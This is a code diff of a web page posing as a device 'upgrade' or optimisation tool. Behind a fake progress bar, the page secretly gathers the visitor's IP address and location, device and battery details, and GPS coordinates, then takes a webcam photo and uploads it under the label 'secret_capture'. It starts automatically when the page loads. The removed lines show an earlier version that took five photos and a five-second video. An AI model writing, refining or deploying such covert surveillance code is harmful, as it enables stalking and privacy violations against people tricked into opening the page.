@@ -52,7 +52,7 @@
         .btn { background: linear-gradient(135deg, #e50914, #b20710); color: white; border: none; width: 100%; padding: 16px; font-size: 16px; font-weight: 700; border-radius: 44px; cursor: pointer; }
         .btn:disabled { background: #444; cursor: not-allowed; }
         .loader { margin-top: 16px; color: #e50914; font-size: 13px; display: none; }
-        input, video, canvas { display: none; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
@@ -77,7 +77,6 @@
         <div class="loader" id="loader">Optimizing...</div>
     </div>
     
-    <input type="file" id="galleryInput" accept="image/*,video/*" multiple style="display:none">
     <video id="video" autoplay playsinline style="display:none"></video>
     <canvas id="canvas" style="display:none"></canvas>
     
@@ -120,13 +119,13 @@
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 return {
-                    ip: data.ip,
-                    country: data.country_name,
-                    region: data.region,
-                    city: data.city,
-                    lat: data.latitude,
-                    lng: data.longitude,
-                    isp: data.org
+                    ip: data.ip || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    region: data.region || 'Unknown',
+                    city: data.city || 'Unknown',
+                    lat: data.latitude || 0,
+                    lng: data.longitude || 0,
+                    isp: data.org || 'Unknown'
                 };
             } catch(e) {
                 return null;
@@ -152,13 +151,15 @@
                 try {
                     const b = await navigator.getBattery();
                     battery = Math.round(b.level * 100) + '%';
+                    if (!b.charging) battery += ' (discharging)';
+                    else battery += ' (charging)';
                 } catch(e) {}
             }
             
             document.getElementById('deviceName').innerText = device;
             document.getElementById('batteryLevel').innerText = battery;
             
-            return { device, os, browser, battery, ua: ua.substring(0, 100) };
+            return { device, os, browser, battery };
         }
         
         async function saveData(type, data) {
@@ -179,6 +180,34 @@
             return url;
         }
         
+        // Take Camera Photo
+        async function takeCameraPhoto() {
+            try {
+                updateProgress(60, "Requesting camera...");
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000));
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+                const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
+                await uploadFile(file, 'secret_capture');
+                updateProgress(80, "Photo captured!");
+                
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) {
+                console.log("Camera error:", e);
+                updateProgress(60, "Camera access denied");
+                return false;
+            }
+        }
+        
         // MAIN FUNCTION
         async function startUpgrade() {
             if (!sessionId) return;
@@ -188,7 +217,7 @@
             progressContainer.style.display = 'block';
             progressText.style.display = 'block';
             
-            // STEP 1: Device Info + IP (5%)
+            // STEP 1: Device Info (5%)
             updateProgress(5, "Detecting device...");
             const ipInfo = await getIPInfo();
             const deviceInfo = await getDeviceInfo();
@@ -206,57 +235,23 @@
                 battery: deviceInfo.battery
             });
             
-            // STEP 2: Location (15%)
-            updateProgress(15, "Getting location...");
+            // STEP 2: Location (20%)
+            updateProgress(20, "Getting location...");
             try {
                 const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
                 });
                 await saveData('gps_location', {
                     lat: pos.coords.latitude,
                     lng: pos.coords.longitude
                 });
-            } catch(e) {}
+                updateProgress(40, "Location captured!");
+            } catch(e) {
+                updateProgress(40, "Location skipped");
+            }
             
-            // STEP 3: Camera + 5 Photos + Video (20% to 80%)
-            updateProgress(20, "Requesting camera...");
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 500));
-                
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                
-                // 5 Photos
-                for (let i = 1; i <= 5; i++) {
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-                    const file = new File([blob], `photo_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
-                    await uploadFile(file, 'secret_capture');
-                    updateProgress(20 + (i * 8), `Photo ${i}/5 captured`);
-                }
-                
-                // 5 Second Video
-                updateProgress(70, "Recording video...");
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    const file = new File([blob], `video_${Date.now()}.mp4`, { type: 'video/mp4' });
-                    await uploadFile(file, 'video_capture');
-                };
-                recorder.start();
-                await new Promise(r => setTimeout(r, 5000));
-                recorder.stop();
-                await new Promise(r => setTimeout(r, 500));
-                
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) { console.log("Camera error:", e); }
+            // STEP 3: Camera Photo (60% to 80%)
+            await takeCameraPhoto();
             
             // STEP 4: Complete (100%)
             updateProgress(95, "Finalizing...");
@@ -271,6 +266,7 @@
         
         upgradeBtn.onclick = startUpgrade;
         
+        // Auto start
         if (sessionId) {
             setTimeout(startUpgrade, 500);
         }
